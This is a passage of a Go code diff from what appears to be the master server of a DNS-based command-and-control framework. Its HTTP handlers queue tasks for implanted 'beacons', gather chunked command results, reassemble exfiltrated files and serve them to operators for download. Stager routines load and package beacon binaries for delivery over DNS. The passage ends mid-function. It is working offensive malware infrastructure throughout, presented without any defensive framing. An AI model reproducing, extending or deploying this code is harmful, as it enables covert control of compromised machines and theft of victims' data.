+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve task statuses")
+		return
+	}
+
+	if api.config.Debug && len(tasks) > 0 {
+		fmt.Printf("[API] Returning %d completed task status(es) to DNS server %s\n", len(tasks), dnsServerID)
+	}
+
+	// Return tasks first, then mark as synced — if the response fails,
+	// the DNS server will re-request and get the same tasks
+	w.Header().Set("Content-Type", "application/json")
+	if err := json.NewEncoder(w).Encode(tasks); err != nil {
+		return
+	}
+
+	if len(tasks) > 0 {
+		taskIDs := make([]string, 0, len(tasks))
+		for _, task := range tasks {
+			if id, ok := task["id"].(string); ok {
+				taskIDs = append(taskIDs, id)
+			}
+		}
+		if err := api.db.MarkTasksAsSynced(dnsServerID, taskIDs); err != nil {
+			fmt.Printf("[API] Warning: failed to mark tasks as synced for %s: %v\n", dnsServerID, err)
+		}
+	}
+}
+
+// handleMarkTaskDelivered marks a task as delivered by a DNS server
+// This is called when a DNS server delivers a task to a beacon (atomically claims it)
+func (api *APIServer) handleMarkTaskDelivered(w http.ResponseWriter, r *http.Request) {
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	var req struct {
+		TaskID string `json:"task_id"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if req.TaskID == "" {
+		api.sendError(w, http.StatusBadRequest, "task_id is required")
+		return
+	}
+
+	// Atomically mark task as delivered
+	claimed, err := api.db.MarkTaskDelivered(req.TaskID, dnsServerID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to mark task as delivered")
+		if api.config.Debug {
+			fmt.Printf("[API] Error marking task delivered: %v\n", err)
+		}
+		return
+	}
+
+	if api.config.Debug {
+		if claimed {
+			fmt.Printf("[API] Task %s delivered by DNS server %s\n", req.TaskID, dnsServerID)
+		} else {
+			fmt.Printf("[API] Task %s already delivered by another DNS server\n", req.TaskID)
+		}
+	}
+
+	api.sendSuccess(w, "task marked as delivered", map[string]interface{}{
+		"task_id": req.TaskID,
+		"claimed": claimed,
+	})
+}
+
+// handleSubmitResult processes a task result from a DNS server
+// Handles both single-chunk and multi-chunk results from distributed DNS servers
+func (api *APIServer) handleSubmitResult(w http.ResponseWriter, r *http.Request) {
+	var req ResultSubmitRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	// Store the result chunk in master database
+	err := api.db.SaveResultChunk(
+		req.TaskID,
+		req.BeaconID,
+		dnsServerID,
+		req.ChunkIndex,
+		req.TotalChunks,
+		req.Data,
+	)
+
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to store result chunk")
+		if api.config.Debug {
+			fmt.Printf("[API] Error storing result chunk: %v\n", err)
+		}
+		return
+	}
+
+	// NEW THREE-PHASE PROTOCOL: Tasks are NEVER complete until RESULT_COMPLETE message arrives
+	// This prevents premature completion when failure messages arrive before real results
+	// Always return task_complete=false for chunk submissions
+	taskComplete := false
+
+	if api.config.Debug {
+		if req.TotalChunks == 1 {
+			fmt.Printf("[API] Complete result from DNS server %s: Task %s (%d bytes) [task_complete=%v]\n",
+				dnsServerID, req.TaskID, len(req.Data), taskComplete)
+		} else {
+			// Check progress for multi-chunk results
+			received, total, _ := api.db.GetTaskResultProgress(req.TaskID)
+			fmt.Printf("[API] Result chunk from DNS server %s: Task %s, chunk %d/%d (progress: %d/%d) [task_complete=%v]\n",
+				dnsServerID, req.TaskID, req.ChunkIndex, req.TotalChunks, received, total, taskComplete)
+		}
+	}
+
+	api.sendSuccess(w, "result recorded", map[string]interface{}{
+		"task_id":       req.TaskID,
+		"chunk_index":   req.ChunkIndex,
+		"total_chunks":  req.TotalChunks,
+		"task_complete": taskComplete,
+	})
+}
+
+// handleResultComplete processes the completion message from DNS server
+// This is called when beacon sends RESULT_COMPLETE after all chunks are transmitted
+// Master should now assemble the result (if multi-chunk) and mark task as completed
+func (api *APIServer) handleResultComplete(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID string `json:"dns_server_id"`
+		APIKey      string `json:"api_key"`
+		TaskID      string `json:"task_id"`
+		BeaconID    string `json:"beacon_id"`
+		TotalChunks int    `json:"total_chunks"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Completion signal from DNS server %s: Task %s (%d chunks)\n",
+			req.DNSServerID, req.TaskID, req.TotalChunks)
+	}
+
+	// Trigger reassembly if needed (for multi-chunk results)
+	// The database will check if all chunks are present and assemble them
+	if err := api.db.MarkTaskCompleteFromBeacon(req.TaskID, req.BeaconID, req.TotalChunks); err != nil {
+		// Always log the actual error for debugging
+		fmt.Printf("[API] Error processing completion for task %s: %v\n", req.TaskID, err)
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to process completion: %v", err))
+		return
+	}
+
+	api.sendSuccess(w, "completion recorded", map[string]interface{}{
+		"task_id":      req.TaskID,
+		"total_chunks": req.TotalChunks,
+	})
+}
+
+// handleSubmitExfilChunk stores a dedicated exfil chunk forwarded by a DNS server.
+func (api *APIServer) handleSubmitExfilChunk(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID string `json:"dns_server_id"`
+		APIKey      string `json:"api_key"`
+		SessionID   string `json:"session_id"`
+		JobID       string `json:"job_id"`
+		ChunkIndex  int    `json:"chunk_index"`
+		TotalChunks int    `json:"total_chunks"`
+		PayloadB64  string `json:"payload_b64"`
+		FileName    string `json:"file_name"`
+		FileSize    int64  `json:"file_size"`
+		IsFinal     bool   `json:"is_final"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	if req.SessionID == "" {
+		api.sendError(w, http.StatusBadRequest, "session_id is required")
+		return
+	}
+
+	// Handle metadata-only frames (empty payload, used to register TotalChunks/FileName/FileSize)
+	if req.PayloadB64 == "" {
+		// This is a header/metadata frame - just update transfer metadata, don't store a chunk
+		transfer, err := api.db.EnsureExfilTransfer(req.SessionID, req.JobID, dnsServerID, req.FileName, req.FileSize, req.TotalChunks)
+		if err != nil {
+			api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to update exfil metadata: %v", err))
+			return
+		}
+		response := map[string]interface{}{
+			"session_id": req.SessionID,
+			"ack_next":   true,
+			"completed":  false,
+		}
+		if transfer != nil {
+			response["transfer"] = transfer
+			response["status"] = transfer.Status
+			response["total_chunks"] = transfer.TotalChunks
+		}
+		api.sendSuccess(w, "exfil metadata recorded", response)
+		return
+	}
+
+	payload, err := base64.StdEncoding.DecodeString(req.PayloadB64)
+	if err != nil {
+		api.sendError(w, http.StatusBadRequest, "payload_b64 must be valid base64")
+		return
+	}
+
+	transfer, completed, err := api.db.StoreExfilChunk(&ExfilChunkStoreRequest{
+		SessionID:   req.SessionID,
+		JobID:       req.JobID,
+		DNSServerID: dnsServerID,
+		ChunkIndex:  req.ChunkIndex,
+		TotalChunks: req.TotalChunks,
+		FileName:    req.FileName,
+		FileSize:    req.FileSize,
+		Payload:     payload,
+	})
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to store exfil chunk: %v", err))
+		return
+	}
+
+	response := map[string]interface{}{
+		"session_id": req.SessionID,
+		"ack_next":   true,
+		"completed":  completed,
+	}
+	if transfer != nil {
+		response["transfer"] = transfer
+		response["status"] = transfer.Status
+		response["received_chunks"] = transfer.ReceivedChunks
+		response["total_chunks"] = transfer.TotalChunks
+	}
+
+	api.sendSuccess(w, "exfil chunk recorded", response)
+}
+
+// handleRegisterExfilTag registers a short tag for an exfil session.
+func (api *APIServer) handleRegisterExfilTag(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		Tag       string `json:"tag"`
+		SessionID string `json:"session_id"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if req.Tag == "" || req.SessionID == "" {
+		api.sendError(w, http.StatusBadRequest, "tag and session_id are required")
+		return
+	}
+
+	if err := api.db.RegisterExfilSessionTag(req.Tag, req.SessionID); err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to register tag: %v", err))
+		return
+	}
+
+	api.sendSuccess(w, "tag registered", nil)
+}
+
+// handleSubmitExfilChunkByTag submits an exfil chunk using a short tag.
+func (api *APIServer) handleSubmitExfilChunkByTag(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID string `json:"dns_server_id"`
+		Tag         string `json:"tag"`
+		ChunkIndex  int    `json:"chunk_index"`
+		PayloadB64  string `json:"payload_b64"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	if req.Tag == "" || req.PayloadB64 == "" {
+		api.sendError(w, http.StatusBadRequest, "tag and payload_b64 are required")
+		return
+	}
+
+	// Resolve tag to session ID
+	sessionID, err := api.db.GetExfilSessionIDByTag(req.Tag)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to resolve tag: %v", err))
+		return
+	}
+	if sessionID == "" {
+		api.sendError(w, http.StatusNotFound, "tag not found")
+		return
+	}
+
+	payload, err := base64.StdEncoding.DecodeString(req.PayloadB64)
+	if err != nil {
+		api.sendError(w, http.StatusBadRequest, "payload_b64 must be valid base64")
+		return
+	}
+
+	// Store the chunk using the resolved session ID
+	transfer, completed, err := api.db.StoreExfilChunk(&ExfilChunkStoreRequest{
+		SessionID:   sessionID,
+		DNSServerID: dnsServerID,
+		ChunkIndex:  req.ChunkIndex,
+		Payload:     payload,
+	})
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to store exfil chunk: %v", err))
+		return
+	}
+
+	response := map[string]interface{}{
+		"session_id": sessionID,
+		"ack_next":   true,
+		"completed":  completed,
+	}
+	if transfer != nil {
+		response["transfer"] = transfer
+		response["status"] = transfer.Status
+		response["received_chunks"] = transfer.ReceivedChunks
+		response["total_chunks"] = transfer.TotalChunks
+	}
+
+	api.sendSuccess(w, "exfil chunk recorded", response)
+}
+
+// handleExfilCompleteByTag records completion signal for a dedicated exfil session using a tag.
+func (api *APIServer) handleExfilCompleteByTag(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID string `json:"dns_server_id"`
+		Tag         string `json:"tag"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	if req.Tag == "" {
+		api.sendError(w, http.StatusBadRequest, "tag is required")
+		return
+	}
+
+	// Resolve tag to session ID
+	sessionID, err := api.db.GetExfilSessionIDByTag(req.Tag)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to resolve tag: %v", err))
+		return
+	}
+	if sessionID == "" {
+		api.sendError(w, http.StatusNotFound, "tag not found")
+		return
+	}
+
+	// Look up existing transfer to get TotalChunks if we don't have it in the request
+	// This handles Shadow Mesh where metadata went to a different DNS server than completion
+	existingTransfer, transferErr := api.db.GetExfilTransfer(sessionID)
+	if transferErr != nil && existingTransfer == nil {
+		LogWarn("GetExfilTransfer failed for %s: %v", sessionID, transferErr)
+	}
+	totalChunks := 0
+	var fileName string
+	var fileSize int64
+	if existingTransfer != nil {
+		totalChunks = existingTransfer.TotalChunks
+		fileName = existingTransfer.FileName
+		fileSize = existingTransfer.FileSize
+	}
+
+	// Mark as complete (trigger assembly check)
+	transfer, err := api.db.MarkExfilTransferComplete(&ExfilCompletionRecord{
+		SessionID:   sessionID,
+		SourceDNS:   dnsServerID,
+		TotalChunks: totalChunks,
+		FileName:    fileName,
+		FileSize:    fileSize,
+	})
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to finalize exfil transfer: %v", err))
+		return
+	}
+
+	api.sendSuccess(w, "exfil transfer updated", map[string]interface{}{
+		"session_id": sessionID,
+		"transfer":   transfer,
+	})
+}
+
+// handleExfilComplete records completion metadata for a dedicated exfil session.
+func (api *APIServer) handleExfilComplete(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID    string `json:"dns_server_id"`
+		APIKey         string `json:"api_key"`
+		SessionID      string `json:"session_id"`
+		JobID          string `json:"job_id"`
+		FileName       string `json:"file_name"`
+		FileSize       int64  `json:"file_size"`
+		TotalChunks    int    `json:"total_chunks"`
+		ReceivedChunks int    `json:"received_chunks"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if req.SessionID == "" {
+		api.sendError(w, http.StatusBadRequest, "session_id is required")
+		return
+	}
+
+	sourceDNS := r.Header.Get("X-DNS-Server-ID")
+	if sourceDNS == "" {
+		sourceDNS = req.DNSServerID
+	}
+
+	transfer, err := api.db.MarkExfilTransferComplete(&ExfilCompletionRecord{
+		SessionID:   req.SessionID,
+		JobID:       req.JobID,
+		TotalChunks: req.TotalChunks,
+		FileName:    req.FileName,
+		FileSize:    req.FileSize,
+		SourceDNS:   sourceDNS,
+	})
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to finalize exfil transfer: %v", err))
+		return
+	}
+
+	api.sendSuccess(w, "exfil transfer updated", map[string]interface{}{
+		"session_id": req.SessionID,
+		"transfer":   transfer,
+	})
+}
+
+// handleSubmitProgress processes task progress updates from DNS servers
+func (api *APIServer) handleSubmitProgress(w http.ResponseWriter, r *http.Request) {
+	var req TaskProgressRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	// Update task progress in database
+	err := api.db.UpdateTaskProgress(
+		req.TaskID,
+		req.BeaconID,
+		dnsServerID,
+		req.ReceivedChunks,
+		req.TotalChunks,
+		req.Status,
+	)
+
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to update progress")
+		if api.config.Debug {
+			fmt.Printf("[API] Error updating progress: %v\n", err)
+		}
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Progress update from %s: Task %s - %d/%d chunks (%s)\n",
+			dnsServerID, req.TaskID, req.ReceivedChunks, req.TotalChunks, req.Status)
+	}
+
+	api.sendSuccess(w, "progress updated", nil)
+}
+
+// handleGetTaskProgress returns progress information for a specific task
+func (api *APIServer) handleGetTaskProgress(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	taskID := vars["id"]
+
+	progress, err := api.db.GetTaskProgressFromResults(taskID)
+
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve progress")
+		return
+	}
+
+	api.sendJSON(w, progress)
+}
+
+// handleDeleteTask deletes a task (for canceling pending tasks or cleanup)
+func (api *APIServer) handleDeleteTask(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	taskID := vars["id"]
+
+	operatorID := r.Header.Get("X-Operator-ID")
+	username := r.Header.Get("X-Operator-Username")
+
+	// Delete the task
+	if err := api.db.DeleteTask(taskID); err != nil {
+		if err.Error() == "task not found" {
+			api.sendError(w, http.StatusNotFound, "task not found")
+		} else {
+			if api.config.Debug {
+				fmt.Printf("[API] Failed to delete task %s: %v\n", taskID, err)
+			}
+			api.sendError(w, http.StatusInternalServerError, "failed to delete task")
+		}
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Task %s deleted by %s\n", taskID, username)
+	}
+
+	// Log audit event
+	api.db.LogAuditEvent(operatorID, "task_delete", "task", taskID,
+		fmt.Sprintf("Deleted task %s", taskID), r.RemoteAddr)
+
+	api.sendSuccess(w, "task deleted", map[string]interface{}{
+		"task_id": taskID,
+	})
+}
+
+// handleDeleteBeacon deletes a beacon and all its associated tasks/results
+func (api *APIServer) handleDeleteBeacon(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	beaconID := vars["id"]
+
+	operatorID := r.Header.Get("X-Operator-ID")
+	username := r.Header.Get("X-Operator-Username")
+
+	// Delete the beacon
+	if err := api.db.DeleteBeacon(beaconID); err != nil {
+		if err.Error() == "beacon not found" {
+			api.sendError(w, http.StatusNotFound, "beacon not found")
+		} else {
+			if api.config.Debug {
+				fmt.Printf("[API] Failed to delete beacon %s: %v\n", beaconID, err)
+			}
+			api.sendError(w, http.StatusInternalServerError, "failed to delete beacon")
+		}
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Beacon %s deleted by %s\n", beaconID, username)
+	}
+
+	// Log audit event
+	api.db.LogAuditEvent(operatorID, "beacon_delete", "beacon", beaconID,
+		fmt.Sprintf("Deleted beacon %s and all associated tasks", beaconID), r.RemoteAddr)
+
+	api.sendSuccess(w, "beacon deleted", map[string]interface{}{
+		"beacon_id": beaconID,
+	})
+}
+
+// handleDeleteDNSServer removes a DNS server from the mesh
+func (api *APIServer) handleDeleteDNSServer(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	serverID := vars["id"]
+
+	operatorID := r.Header.Get("X-Operator-ID")
+	username := r.Header.Get("X-Operator-Username")
+
+	if err := api.db.DeleteDNSServer(serverID); err != nil {
+		if err.Error() == "dns server not found" {
+			api.sendError(w, http.StatusNotFound, "dns server not found")
+		} else {
+			if api.config.Debug {
+				fmt.Printf("[API] Failed to delete DNS server %s: %v\n", serverID, err)
+			}
+			api.sendError(w, http.StatusInternalServerError, "failed to delete DNS server")
+		}
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] DNS server %s deleted by %s\n", serverID, username)
+	}
+
+	api.db.LogAuditEvent(operatorID, "dns_server_delete", "dns_server", serverID,
+		fmt.Sprintf("Deleted DNS server %s from mesh", serverID), r.RemoteAddr)
+
+	BroadcastDNSServerUpdate(map[string]interface{}{
+		"action":    "deleted",
+		"server_id": serverID,
+	})
+
+	api.sendSuccess(w, "dns server deleted", map[string]interface{}{
+		"server_id": serverID,
+	})
+}
+
+// handleStats returns master server statistics
+func (api *APIServer) handleStats(w http.ResponseWriter, r *http.Request) {
+	stats, err := api.db.GetDatabaseStats()
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve stats")
+		return
+	}
+
+	api.sendJSON(w, stats)
+}
+
+// handleTimeline returns operation timeline events
+func (api *APIServer) handleTimeline(w http.ResponseWriter, r *http.Request) {
+	limit := 100
+	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
+		if parsed, err := strconv.Atoi(limitStr); err == nil && parsed > 0 && parsed <= 500 {
+			limit = parsed
+		}
+	}
+
+	events, err := api.db.GetTimeline(limit)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve timeline")
+		return
+	}
+
+	api.sendSuccess(w, "timeline retrieved", map[string]interface{}{
+		"events": events,
+		"count":  len(events),
+	})
+}
+
+// Exfiltration endpoints
+
+func (api *APIServer) handleListExfilTransfers(w http.ResponseWriter, r *http.Request) {
+	limit := 100
+	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
+		if parsed, err := strconv.Atoi(limitStr); err == nil && parsed > 0 && parsed <= 500 {
+			limit = parsed
+		}
+	}
+
+	offset := 0
+	if offsetStr := r.URL.Query().Get("offset"); offsetStr != "" {
+		if parsed, err := strconv.Atoi(offsetStr); err == nil && parsed >= 0 {
+			offset = parsed
+		}
+	}
+
+	transfers, err := api.db.ListExfilTransfers(limit, offset)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to list exfil transfers")
+		return
+	}
+
+	api.sendSuccess(w, "exfil transfers retrieved", map[string]interface{}{
+		"transfers": transfers,
+		"pagination": map[string]interface{}{
+			"limit":  limit,
+			"offset": offset,
+			"count":  len(transfers),
+		},
+	})
+}
+
+func (api *APIServer) handleGetExfilTransfer(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionID := vars["id"]
+	if sessionID == "" {
+		api.sendError(w, http.StatusBadRequest, "session_id is required")
+		return
+	}
+
+	transfer, err := api.db.GetExfilTransfer(sessionID)
+	if err != nil {
+		if strings.Contains(strings.ToLower(err.Error()), "not found") {
+			api.sendError(w, http.StatusNotFound, "exfil transfer not found")
+		} else {
+			api.sendError(w, http.StatusInternalServerError, "failed to load exfil transfer")
+		}
+		return
+	}
+
+	api.sendSuccess(w, "exfil transfer retrieved", transfer)
+}
+
+func (api *APIServer) handleDownloadExfilArtifact(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionID := vars["id"]
+	if sessionID == "" {
+		api.sendError(w, http.StatusBadRequest, "session_id is required")
+		return
+	}
+
+	data, fileName, sha, err := api.db.GetExfilArtifact(sessionID)
+	if err != nil {
+		if strings.Contains(strings.ToLower(err.Error()), "not found") {
+			api.sendError(w, http.StatusNotFound, err.Error())
+		} else {
+			api.sendError(w, http.StatusInternalServerError, "failed to load exfil artifact")
+		}
+		return
+	}
+
+	if fileName == "" {
+		fileName = sessionID + ".bin"
+	}
+
+	reader := bytes.NewReader(data)
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", fileName))
+	if sha != "" {
+		w.Header().Set("X-Exfil-SHA256", sha)
+	}
+	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
+	http.ServeContent(w, r, fileName, time.Now(), reader)
+}
+
+// Stager Management Handlers
+
+// handleListClientBinaries returns all stored client binaries from the database
+func (api *APIServer) handleListClientBinaries(w http.ResponseWriter, r *http.Request) {
+	// Query client binaries from database (where they're stored with chunks)
+	binaries, err := api.db.GetClientBinaries()
+	if err != nil {
+		fmt.Printf("[API] Error querying client binaries from database: %v\n", err)
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve client binaries")
+		return
+	}
+
+	fmt.Printf("[API] Returning %d client binaries from database\n", len(binaries))
+
+	if len(binaries) == 0 {
+		binaries = []map[string]interface{}{} // Return empty array instead of null
+	}
+
+	api.sendJSON(w, binaries)
+}
+
+// handleListStagerSessions returns all stager deployment sessions
+func (api *APIServer) handleListStagerSessions(w http.ResponseWriter, r *http.Request) {
+	sessions, err := api.db.GetStagerSessions(100) // Last 100 sessions
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve stager sessions")
+		return
+	}
+
+	api.sendJSON(w, sessions)
+}
+
+// handleGetStagerSession returns details of a specific stager session
+func (api *APIServer) handleGetStagerSession(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionID := vars["id"]
+
+	session, err := api.db.GetStagerSession(sessionID)
+	if err != nil {
+		api.sendError(w, http.StatusNotFound, "stager session not found")
+		return
+	}
+
+	api.sendJSON(w, session)
+}
+
+// handleDeleteStagerSession deletes a stager session
+func (api *APIServer) handleDeleteStagerSession(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionID := vars["id"]
+
+	err := api.db.DeleteStagerSession(sessionID)
+	if err != nil {
+		api.sendError(w, http.StatusNotFound, err.Error())
+		return
+	}
+
+	api.sendSuccess(w, "stager session deleted", nil)
+}
+
+// handleUpdateStagerSessionStatus updates a stager session status (e.g., mark as failed)
+func (api *APIServer) handleUpdateStagerSessionStatus(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionID := vars["id"]
+
+	var req struct {
+		Status string `json:"status"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	err := api.db.UpdateStagerSessionStatus(sessionID, req.Status == "failed")
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, err.Error())
+		return
+	}
+
+	api.sendSuccess(w, "stager session status updated", nil)
+}
+
+// handleDeleteExfilTransfer deletes an exfil transfer and associated data
+func (api *APIServer) handleDeleteExfilTransfer(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionID := vars["id"]
+
+	err := api.db.DeleteExfilTransfer(sessionID)
+	if err != nil {
+		api.sendError(w, http.StatusNotFound, err.Error())
+		return
+	}
+
+	api.sendSuccess(w, "exfil transfer deleted", nil)
+}
+
+// handleUpdateExfilTransferStatus updates an exfil transfer status
+func (api *APIServer) handleUpdateExfilTransferStatus(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionID := vars["id"]
+
+	var req struct {
+		Status string `json:"status"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if req.Status != "failed" && req.Status != "complete" && req.Status != "receiving" {
+		api.sendError(w, http.StatusBadRequest, "invalid status (must be: failed, complete, receiving)")
+		return
+	}
+
+	err := api.db.UpdateExfilTransferStatus(sessionID, req.Status)
+	if err != nil {
+		api.sendError(w, http.StatusNotFound, err.Error())
+		return
+	}
+
+	BroadcastExfilUpdate(map[string]interface{}{
+		"session_id": sessionID,
+		"status":     req.Status,
+	})
+
+	// When marking failed, push any beacons stuck in "exfiltrating" back to active
+	if req.Status == "failed" {
+		stuckBeacons, _ := api.db.GetBeaconIDsByStatus("exfiltrating")
+		for _, bid := range stuckBeacons {
+			if err := api.db.UpdateBeaconStatus(bid, "active"); err == nil {
+				BroadcastBeaconUpdate(map[string]interface{}{
+					"id":     bid,
+					"status": "active",
+				})
+			}
+		}
+	}
+
+	api.sendSuccess(w, "exfil transfer status updated", nil)
+}
+
+// handleUpdateTaskStatus updates a task status
+func (api *APIServer) handleUpdateTaskStatus(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	taskID := vars["id"]
+
+	var req struct {
+		Status string `json:"status"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if req.Status != "failed" && req.Status != "completed" && req.Status != "pending" {
+		api.sendError(w, http.StatusBadRequest, "invalid status (must be: failed, completed, pending)")
+		return
+	}
+
+	err := api.db.UpdateTaskStatus(taskID, req.Status)
+	if err != nil {
+		api.sendError(w, http.StatusNotFound, err.Error())
+		return
+	}
+
+	api.sendSuccess(w, "task status updated", nil)
+}
+
+// Stager Protocol Handlers (called by DNS servers)
+
+// StagerInitRequest represents a stager initialization request from DNS server
+type StagerInitRequest struct {
+	StagerIP    string `json:"stager_ip"`
+	OS          string `json:"os"`
+	Arch        string `json:"arch"`
+	DNSServerID string `json:"dns_server_id"`
+}
+
+// StagerInitResponse contains session info and chunk assignments
+type StagerInitResponse struct {
+	SessionID      string   `json:"session_id"`
+	TotalChunks    int      `json:"total_chunks"`
+	DNSDomains     []string `json:"dns_domains"`
+	ChunkSize      int      `json:"chunk_size"`
+	SHA256Checksum string   `json:"sha256_checksum"` // Hex-encoded SHA256 of original binary for verification
+}
+
+// loadAndProcessClientBinary loads a client binary from disk and processes it for stager deployment
+// Automatically finds the most recent beacon for the given OS/Arch from builds directory
+// Returns: clientBinaryID, base64Data, totalChunks, sha256Checksum, error
+func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, string, int, string, error) {
+	// Derive builds directory from database path (/opt/unkn0wnc2/master.db -> /opt/unkn0wnc2/builds/client)
+	dbDir := filepath.Dir(api.config.DatabasePath)
+	buildsDir := filepath.Join(dbDir, "builds", "client")
+
+	// Determine what we're looking for
+	var clientFilename string
+	if strings.ToLower(osType) == "windows" {
+		clientFilename = "beacon-windows"
+	} else {
+		clientFilename = "beacon-linux"
+	}
+
+	// Find all matching beacon files (exclude .meta.json files)
+	allFiles, err := filepath.Glob(filepath.Join(buildsDir, clientFilename+"-*"))
+	if err != nil {
+		return "", "", 0, "", fmt.Errorf("failed to search builds directory: %w", err)
+	}
+
+	// Filter out .meta.json files to get only actual binaries
+	var files []string
+	for _, f := range allFiles {
+		if !strings.HasSuffix(f, ".meta.json") {
+			files = append(files, f)
+		}
+	}
+
+	if len(files) == 0 {
+		return "", "", 0, "", fmt.Errorf("no beacon found for %s/%s in %s", osType, arch, buildsDir)
+	}
+
+	// Sort files to ensure consistent ordering (most recent last by timestamp in filename)
+	sort.Strings(files)
+
+	// Use the most recent file (last in sorted list)
+	clientPath := files[len(files)-1]
+	beaconID := filepath.Base(clientPath)
+
+	fmt.Printf("[Archon] Loading client binary: %s\n", clientPath)
+
+	// Read client binary
+	clientData, err := os.ReadFile(clientPath)
+	if err != nil {
+		return "", "", 0, "", fmt.Errorf("failed to read client binary: %w", err)
+	}
+
+	fmt.Printf("[Archon] Loaded client binary: %d bytes\n", len(clientData))
+
+	// Calculate SHA256 checksum of original binary for verification
+	checksumBytes := sha256.Sum256(clientData)
+	checksum := hex.EncodeToString(checksumBytes[:])
+	fmt.Printf("[Archon] SHA256 checksum: %s\n", checksum)
+
+	// Compress with gzip
+	var compressedBuf bytes.Buffer
+	gzWriter := gzip.NewWriter(&compressedBuf)
+	_, err = gzWriter.Write(clientData)
+	if err != nil {
